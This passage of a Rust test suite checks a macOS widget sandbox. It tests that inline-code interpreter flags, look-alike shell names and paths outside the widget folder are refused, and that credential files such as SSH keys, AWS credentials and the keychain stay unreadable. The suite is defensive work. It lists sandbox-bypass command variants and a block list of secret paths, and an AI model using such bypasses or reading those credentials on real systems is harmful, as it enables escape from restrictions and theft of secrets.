        r#"["/bin/sh", "run.sh", "한글 ❤ x", "1\u20E3", "🇰🇷", "e\u0301"]"#,
    )
    .unwrap_or_else(|e| panic!("{e}"));
    let source = fs::read_to_string(
        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("src/approval/manifest.rs"),
    )
    .unwrap();
    assert!(!source.contains("fn plain("), "a second denylist remains");
}

// v1b-31 r2 (M1): APFS folds case fully, so `/bin/ſh` runs sh and `ﬁsh` runs fish; a versioned name (`perl5.34`) is
// the same interpreter. A program name that does not fold to ASCII is refused; look-alike names still pass.
#[test]
fn interpreter_names_match_after_case_folding_and_versions() {
    let h = H::new();
    for (i, command) in [
        r#"["/bin/ſh", "-c", "echo hi"]"#,
        r#"["/bin/baſh", "-c", "echo hi"]"#,
        r#"["/usr/bin/nice", "ſh", "-c", "echo hi"]"#,
        r#"["ﬁsh", "-c", "echo hi"]"#,
        r#"["/usr/bin/oſascript", "-e", "beep"]"#,
        r#"["/bin/Ksh", "-c", "echo hi"]"#,
        r#"["/usr/bin/perl5.34", "-e", "print 1"]"#,
        r#"["python3.12", "-c", "print(1)"]"#,
        r#"["/opt/homebrew/bin/node22", "-e", "1"]"#,
        r#"["ruby3.3", "-e", "1"]"#,
        r#"["/bin/BASH5", "-c", "echo hi"]"#,
    ]
    .iter()
    .enumerate()
    {
        let e = load(&h, &format!("bad{i}"), command).unwrap_err();
        assert!(e.contains("inline script"), "{command}: {e}");
    }
    let e = load(&h, "cyrillic", r#"["/bin/ѕh", "-c", "echo hi"]"#).unwrap_err();
    assert!(e.contains("ASCII"), "{e}");
    for (i, command) in [
        "['/usr/bin/shasum', '-c', 'sums.txt']",
        "['/usr/bin/shortcuts', 'run', 'x']",
        "['/usr/bin/perldoc', '-e', 'x']",
        "['/bin/sh', 'run.sh', 'stra\u{00DF}e']",
    ]
    .iter()
    .enumerate()
    {
        load(&h, &format!("good{i}"), command).unwrap_or_else(|e| panic!("{command}: {e}"));
    }
}

// v1b-31 r2 (S1): inline code in a module or preload option of a listed interpreter is refused.
#[test]
fn inline_flags_in_module_and_import_options_are_refused() {
    let h = H::new();
    for (i, command) in [
        r#"['perl', '-Mstrict;print 1', 'x.pl']"#,
        r#"['perl', '-wMstrict;system q(id)', 'x.pl']"#,
        r#"['perl', '-mFoo;x', 'x.pl']"#,
        r#"['node', '--import=data:text/javascript,1', 'w.js']"#,
        r#"['node', '--import=DATA:text/javascript,1', 'w.js']"#,
        r#"['node', '--import', 'data:text/javascript,1', 'w.js']"#,
        r#"['node', '--require=data:text/javascript,1', 'w.js']"#,
        r#"['node', '-r', 'data:text/javascript,1', 'w.js']"#,
        r#"['node', '--experimental-loader', 'data:text/javascript,1', 'w.js']"#,
        r#"['fish', '-C', 'echo hi', 'run.fish']"#,
        r#"['fish', '--init-command=echo hi', 'run.fish']"#,
        r#"['fish', '--comm', 'echo hi', 'run.fish']"#,
        r#"['fish', '--init', 'x', 'run.fish']"#,
        // v1b-31 r4: not in `ALLOWED_INTERPRETER_FLAGS` (an import list; an unlisted value flag).
        r#"['perl', '-Mstrict', '-MList::Util=sum', 'run.pl']"#,
        r#"['python3', '-Wignore::DeprecationWarning', 'run.py']"#,
    ]
    .iter()
    .enumerate()
    {
        let e = load(&h, &format!("bad{i}"), command).unwrap_err();
        assert!(e.contains("inline script"), "{command}: {e}");
    }
    for (i, command) in [
        "['perl', '-MFile::Spec', 'run.pl']",
        "['perl', '-Imy/lib', 'run.pl']",
        "['ruby', '-rsome-thing', 'run.rb']",
        "['node', '--import=./register.mjs', 'w.js']",
        "['node', '-r', './setup.js', 'w.js']",
        "['/bin/bash', '-C', 'run.sh']",
    ]
    .iter()
    .enumerate()
    {
        load(&h, &format!("good{i}"), command).unwrap_or_else(|e| panic!("{command}: {e}"));
    }
}

// v1b-31 r2 (S3): a path glued to a short option (`-o/x`, `-C/x`, `-I../x`) is a path like any other.
#[test]
fn short_option_with_glued_path_counts_as_outside_the_folder() {
    let h = H::new();
    for (i, command) in [
        "['/usr/bin/curl', '-o/Users/x/.zshrc', 'https://x.example']",
        "['/usr/bin/tar', '-C/etc', '-xf', 'a.tar']",
        "['/usr/bin/grep', '-f/Users/x/p', 'data.txt']",
        "['/usr/bin/git', '-C/etc/x', 'status']",
        "['perl', '-I../lib', 'run.pl']",
        "['/usr/bin/tool', '-o~/x']",
        "['/usr/bin/tool', '-o$HOME/x']",
    ]
    .iter()
    .enumerate()
    {
        let e = load(&h, &format!("bad{i}"), command).unwrap_err();
        assert!(e.contains("outside the widget folder"), "{command}: {e}");
    }
    for (i, command) in [
        "['/usr/bin/tool', '-ofile.txt']",
        "['/usr/bin/tool', '-n5', '-o', 'sub/file']",
        "['/sbin/ping', '-c', '1', 'example.com']",
        "['perl', '-Ilib', 'run.pl']",
        "['perl', '-Ilib/sub', 'run.pl']",
        "['/usr/bin/tool', '-ofoo/bar']",
    ]
    .iter()
    .enumerate()
    {
        load(&h, &format!("good{i}"), command).unwrap_or_else(|e| panic!("{command}: {e}"));
    }
}

// v1b-31 r3: a code flag anywhere in a perl or ruby cluster is inline code, after flags with a bounded or no value
// (`-l`, `-0`, `-S`, `-K`, `-T`, `-i`, `-F`, `-D`, `-C`) too; an option word with whitespace is refused, because perl
// reads more switches after a space. Only a letter that takes the whole rest of the word (`-I`, `-x`; ruby `-r`)
// ends the scan. r4: `ALLOWED_INTERPRETER_FLAGS` replaces that walk; the words it drops are refused below.
#[test]
fn clustered_code_flags_after_value_letters_are_refused() {
    let h = H::new();
    for (i, command) in [
        "['perl', '-le', 'print 1']",
        "['perl', '-Se', 'print 1']",
        "['perl', '-l0e', 'print 1']",
        "['perl', '-0777e', 'print 1']",
        "['perl', '-i.b -eprint 1']",
        "['perl', '-F, -eprint 1']",
        "['perl', '-D1 -eprint 1']",
        "['perl', '-CSe', 'print 1']",
        "['perl', '-w -Mstrict', 'x.pl']",
        "['ruby', '-Se', 'puts 1']",
        "['ruby', '-Kue', 'puts 1']",
        "['ruby', '-T1e', 'puts 1']",
        "['ruby', '-w -e', 'puts 1']",
        "['python3', '-bBc', 'print(1)']",
        // v1b-31 r4: not in `ALLOWED_INTERPRETER_FLAGS` (clusters, an import list, an unlisted value flag).
        "['perl', '-MList::Util=sum', '-MFile::Spec', 'run.pl']",
        "['perl', '-pi.bak', 'run.pl']",
        "['perl', '-lw', 'run.pl']",
        "['python3', '-Wignore::DeprecationWarning', 'run.py']",
    ]
    .iter()
    .enumerate()
    {
        let e = load(&h, &format!("bad{i}"), command).unwrap_err();
        assert!(e.contains("inline script"), "{command}: {e}");
    }
    for (i, command) in [
        "['perl', '-Imy/lib', 'run.pl']",
        "['perl', '-MFile::Spec', 'run.pl']",
        "['ruby', '-rsome-thing', 'run.rb']",
        "['ruby', '-Ku', 'run.rb']",
    ]
    .iter()
    .enumerate()
    {
        load(&h, &format!("good{i}"), command).unwrap_or_else(|e| panic!("{command}: {e}"));
    }
}

// v1b-31 r3 (S2): the README's residual list is true. Each named gap is still accepted, and the README names it, so
// closing a gap (or forgetting to document one) fails here.
#[test]
fn readme_residuals_are_still_accepted() {
    let h = H::new();
    let readme =
        fs::read_to_string(PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("README.md")).unwrap();
    for (i, (command, named)) in [
        ("['/usr/bin/expect', '-c', 'x']", "`expect -c`"),
        (
            "['/usr/bin/sqlite3', 'db', '.shell x']",
            "`sqlite3 db '.shell cmd'`",
        ),
        (
            "['/usr/bin/ssh', '-o', 'ProxyCommand=x', 'h']",
            "`ssh -o ProxyCommand=...`",
        ),
        (
            "['/usr/bin/git', '-c', 'alias.x=!x', 'x']",
            "`git -c alias.x='!cmd'`",
        ),
        (
            "['/usr/bin/env', 'PERL5OPT=-Mx', 'perl', 'run.pl']",
            "PERL5OPT",
        ),
        ("['/usr/bin/tar', '-xf/Users/x/a.tar']", "`tar -xf/path`"),
    ]
    .iter()
    .enumerate()
    {
        load(&h, &format!("gap{i}"), command).unwrap_or_else(|e| panic!("{command}: {e}"));
        assert!(readme.contains(named), "README does not name {named}");
    }
    assert!(
        readme.contains("V1B-33"),
        "README does not name the read-scope boundary"
    );
}

// v1b-33: a sentinel file under the fake user home, readable outside the sandbox.
fn secret(h: &H, relative: &str) -> PathBuf {
    let f = h.user.join(relative);
    fs::create_dir_all(f.parent().unwrap()).unwrap();
    fs::write(&f, "SECRET-SENTINEL").unwrap();
    f
}
// v1b-33: a script that prints `READ <path>` for each path it can read and `DENIED <path>` otherwise.
fn probe(paths: &[&PathBuf]) -> String {
    paths
        .iter()
        .map(|p| {
            format!(
                "if /bin/cat '{0}' >/dev/null 2>&1; then echo 'READ {0}'; else echo 'DENIED {0}'; fi\n",
                p.display()
            )
        })
        .collect()
}
fn verdicts(paths: &[&PathBuf], word: &str) -> String {
    paths
        .iter()
        .map(|p| format!("{word} {}\n", p.display()))
        .collect()
}

// v1b-33 (needs 45): by default a script widget reads its project and cache, never the rest of the home.
#[test]
fn widget_read_outside_project_refused_by_default() {
    let h = H::new();
    let outside = secret(&h, "other/.env");
    let inside = h.project.join("README.md");
    fs::write(&inside, "project file").unwrap();
    h.widget("demo", "", &probe(&[&inside, &outside]));
    h.grant("demo");
    let out = text(&h.run("demo").unwrap());
    assert_eq!(
        out,
        format!("READ {}\nDENIED {}\n", inside.display(), outside.display())
    );
}

#[test]
fn widget_declared_read_allowed_after_approval() {
    let h = H::new();
    let other = secret(&h, "other/.env");
    let hangul = secret(&h, "문서/메모.txt");
    let undeclared = secret(&h, "elsewhere/.env");
    let paths = [&other, &hangul, &undeclared];
    // Trailing slash, a Hangul path and a duplicate are fine; `~/later` does not exist yet.
    h.widget(
        "demo",
        "read = [\"~/other/\", \"~/문서\", \"~/other\", \"~/later\"]\n",
        &probe(&paths),
    );
    assert!(h.run("demo").unwrap_err().contains("not approved"));
    h.grant("demo");
    assert_eq!(
        text(&h.run("demo").unwrap()),
        format!(
            "READ {}\nREAD {}\nDENIED {}\n",
            other.display(),
            hangul.display(),
            undeclared.display()
        )
    );
    let view = approval::status(&h.home, "demo").unwrap();
    assert_eq!(view.manifest.read, ["~/other/", "~/문서", "~/later"]);
}

#[test]
fn widget_declared_blocked_path_still_refused() {
    let h = H::new();
    let blocked: Vec<PathBuf> = [
        ".ssh/id_ed25519",
        ".claude/settings.json",
        ".codex/auth.json",
        ".nunchiro/core.token",
        ".aws/credentials",
        ".config/gh/hosts.yml",
        "Library/Keychains/login.keychain-db",
    ]
    .iter()
    .map(|p| secret(&h, p))
    .collect();
    let open = secret(&h, "notes/todo.txt");
    let token = h.home.join("core.token");
    fs::write(&token, "FAKE-OWNER-TOKEN").unwrap();
    let mut paths: Vec<&PathBuf> = blocked.iter().collect();
    paths.push(&token);
    let declared = format!(
        "read = [\"~\", \"~/.ssh\", \"~/.claude\", \"~/.codex\", \"~/.nunchiro\", \"{}\"]\n",
        h.home.display()
    );
    h.widget("demo", &declared, &(probe(&paths) + &probe(&[&open])));
    h.grant("demo");
    assert_eq!(
        text(&h.run("demo").unwrap()),
        verdicts(&paths, "DENIED") + &verdicts(&[&open], "READ")
    );
}

#[test]
fn widget_read_change_asks_again() {
    let h = H::new();
    let other = secret(&h, "other/.env");
    let d = h.widget("demo", "read = []\n", &probe(&[&other]));
    h.grant("demo");
    assert_eq!(text(&h.run("demo").unwrap()), verdicts(&[&other], "DENIED"));
    let manifest = fs::read_to_string(d.join("widget.toml")).unwrap();
    fs::write(
        d.join("widget.toml"),
        manifest.replace("read = []", "read = [\"~/other\"]"),
    )
    .unwrap();
    assert_eq!(
        approval::status(&h.home, "demo").unwrap().state,
        State::Changed
    );
    let err = h.run("demo").unwrap_err();
    assert!(err.contains("changed since it was approved"), "{err}");
    h.grant("demo");
    assert_eq!(text(&h.run("demo").unwrap()), verdicts(&[&other], "READ"));
}

#[test]
fn widget_read_manifest_validation() {
    let h = H::new();
    let many = format!(
        "[{}]",
        (0..33)
            .map(|i| format!("\"~/d{i}\""))
            .collect::<Vec<_>>()
            .join(", ")
    );
    for (i, read) in [
        r#"["relative/path"]"#,
        r#"["./x"]"#,
        r#"["~/a/../.ssh"]"#,
        r#"["/Users/../etc"]"#,
        r#"["~/a/./b"]"#,
        r#"["~root/x"]"#,
        r#"["$HOME/x"]"#,
        r#"[""]"#,
        r#"["~/a\tb"]"#,
        "[\"~/a\\u202Eb\"]",
        r#"["~/a\"b"]"#,
        r#"["~/a\\b"]"#,
        many.as_str(),
    ]
    .iter()
    .enumerate()
    {
        let d = h.widget(&format!("bad{i}"), &format!("read = {read}\n"), "echo x\n");
        let e = approval::status(&h.home, &format!("bad{i}")).unwrap_err();
        assert!(e.contains("read"), "{read}: {e}");
        fs::remove_dir_all(d).unwrap();
    }
    // Only script widgets read files; a web widget or integration source may not declare `read`.
    let d = h.home.join("widgets/page");
    fs::create_dir_all(&d).unwrap();
    fs::write(d.join("index.html"), "<p>x</p>").unwrap();
    fs::write(
        d.join("widget.toml"),
        "version=1\nkind='web'\nentry='index.html'\nread=['~/x']\n",
    )
    .unwrap();
    assert!(
        approval::status(&h.home, "page")
            .unwrap_err()
            .contains("read")
    );
    for read in [
        r#"[]"#,
        r#"["~"]"#,
        r#"["~/"]"#,
        r#"["/"]"#,
        r#"["/opt/data/"]"#,
    ] {
        h.widget("good", &format!("read = {read}\n"), "echo x\n");
        approval::status(&h.home, "good").unwrap_or_else(|e| panic!("{read}: {e}"));
    }
}

#[test]
fn widget_read_symlink_to_blocked_refused() {
    let h = H::new();
    let ssh = secret(&h, ".ssh/id_ed25519");
    let other = secret(&h, "other/.env");
    let (to_ssh, to_other) = (h.project.join("key"), h.project.join("env"));
    std::os::unix::fs::symlink(&ssh, &to_ssh).unwrap();
    std::os::unix::fs::symlink(&other, &to_other).unwrap();
    // A declared link to a blocked folder does not open it either.
    let declared = h.user.join("dots");
    std::os::unix::fs::symlink(h.user.join(".ssh"), &declared).unwrap();
    let via = declared.join("id_ed25519");
    h.widget(
        "demo",
        "read = [\"~/dots\"]\n",
        &probe(&[&to_ssh, &to_other, &via]),
    );
    h.grant("demo");
    assert_eq!(
        text(&h.run("demo").unwrap()),
        verdicts(&[&to_ssh, &to_other, &via], "DENIED")
    );
}

// v1b-33: the home-wide flag comes from the core: `~`, the home itself or any folder holding it.
#[test]
fn widget_read_home_wide_flag() {
    let h = H::new();
    let home = &h.user;
    for (entry, wide) in [
        ("~", true),
        ("~/", true),
        ("/", true),
        ("~/other", false),
        ("/opt/data", false),
    ] {
        assert_eq!(approval::home_wide(entry, home), wide, "{entry}");
    }
    assert!(approval::home_wide(&home.display().to_string(), home));
    assert!(approval::home_wide(&format!("{}/", home.display()), home));
    assert!(approval::home_wide(&h.root.display().to_string(), home));
    // A link to the home covers it too.
    let link = h.root.join("home-link");
    std::os::unix::fs::symlink(home, &link).unwrap();
    assert!(approval::home_wide(&link.display().to_string(), home));
    assert!(!approval::home_wide(
        &home.join("x").display().to_string(),
        home
    ));
    // APFS and the sandbox match names without case: `/USERS/<name>` reads the home too.
    let upper = home.display().to_string().to_uppercase();
    assert!(approval::home_wide(&upper, home), "{upper}");
}

// v1b-33: the default read list starts the generated template and common interpreters with an empty HOME.
// python3 is left out: /usr/bin/python3 (an xcrun shim) and Homebrew's (a framework stub) both start the real python
// with posix_spawn, which every run refuses (v1b-21), whatever it may read.
#[test]
fn widget_default_read_starts_interpreters() {
    let h = H::new();
    let d = h.home.join("widgets/langs");
    fs::create_dir_all(&d).unwrap();
    fs::write(d.join("t.pl"), "print qq(pl ok\\n);\n").unwrap();
    fs::write(d.join("t.js"), "console.log('js ok')\n").unwrap();
    fs::write(d.join("t.scpt"), "return \"osa ok\"\n").unwrap();
    let mut programs = vec![
        ("/bin/sh", "t.sh", "sh ok\n"),
        ("/usr/bin/perl", "t.pl", "pl ok\n"),
        ("/usr/bin/osascript", "t.scpt", "osa ok\n"),
    ];
    for (program, file, out) in [("/opt/homebrew/bin/node", "t.js", "js ok\n")] {
        if PathBuf::from(program).exists() {
            programs.push((program, file, out));
        }
    }
    fs::write(d.join("t.sh"), "echo sh ok\n").unwrap();
    for (program, file, out) in programs {
        fs::write(
            d.join("widget.toml"),
            format!("version=1\nkind='script'\ncommand=['{program}','{file}']\n"),
        )
        .unwrap();
        h.grant("langs");
        let mut config = h.config();
        config.timeout = Duration::from_secs(10);
        // r2: node's start stall (getpwuid on a refused mach lookup) is gone with `__CF_USER_TEXT_ENCODING`.
        let run = widgets::run(&h.home, &config, "langs", h.project(), &context()).unwrap();
        assert_eq!(
            run.output,
            Some(Output::Text { text: out.into() }),
            "{program}: {:?}",
            run.error
        );
    }
}

// v1b-33 r2 (review M1): stat of a blocked file is refused too, by default and with the whole home declared; other
// paths still answer stat (realpath and symlink lookups need it).
#[test]
fn widget_blocked_path_stat_refused() {
    let h = H::new();
    let ssh = secret(&h, ".ssh/id_ed25519");
    let claude = secret(&h, ".claude/settings.json");
    let token = h.home.join("core.token");
    fs::write(&token, "FAKE-OWNER-TOKEN").unwrap();
    let other = secret(&h, "other/.env");
    let stat = |paths: &[&PathBuf]| -> String {
        paths
            .iter()
            .map(|p| {
                format!(
                    "if /usr/bin/stat -f %z '{0}' >/dev/null 2>&1; then echo 'STAT {0}'; else echo 'NOSTAT {0}'; fi\n",
                    p.display()
                )
            })
            .collect()
    };
    let script = stat(&[&ssh, &claude, &token]) + &stat(&[&other]);
    let expected = verdicts(&[&ssh, &claude, &token], "NOSTAT") + &verdicts(&[&other], "STAT");
    h.widget("plain", "", &script);
    h.widget("whole", "read = [\"~\", \"~/.ssh\"]\n", &script);
    for name in ["plain", "whole"] {
        h.grant(name);
        assert_eq!(text(&h.run(name).unwrap()), expected, "{name}");
    }
}

// v1b-33 r2 (review S1): Homebrew's `var/` holds service data (databases), not tools: a default run does not read
// it; a declared `read` does. Skipped where this host has no file there to probe.
#[test]
fn widget_default_read_skips_homebrew_var() {
    let Some(file) = ["/opt/homebrew/var", "/usr/local/var"]
        .iter()
        .flat_map(|d| walk_files(&PathBuf::from(d), 3))
        .find(|f| fs::read(f).is_ok())
    else {
        eprintln!("no readable file under Homebrew var; skipped");
        return;
    };
    let h = H::new();
    h.widget("plain", "", &probe(&[&file]));
    let var = if file.starts_with("/opt/homebrew") {
        "/opt/homebrew/var"
    } else {
        "/usr/local/var"
    };
    h.widget(
        "declared",
        &format!("read = [\"{var}\"]\n"),
        &probe(&[&file]),
    );
    h.grant("plain");
    h.grant("declared");
    assert_eq!(text(&h.run("plain").unwrap()), verdicts(&[&file], "DENIED"));
    assert_eq!(
        text(&h.run("declared").unwrap()),
        verdicts(&[&file], "READ")
    );
}
fn walk_files(dir: &std::path::Path, depth: usize) -> Vec<PathBuf> {
    let mut out = vec![];
    for e in fs::read_dir(dir).into_iter().flatten().flatten() {
        let p = e.path();
        match e.file_type() {
            Ok(t) if t.is_file() => out.push(p),
            Ok(t) if t.is_dir() && depth > 0 => out.extend(walk_files(&p, depth - 1)),
            _ => {}
        }
    }
    out
}
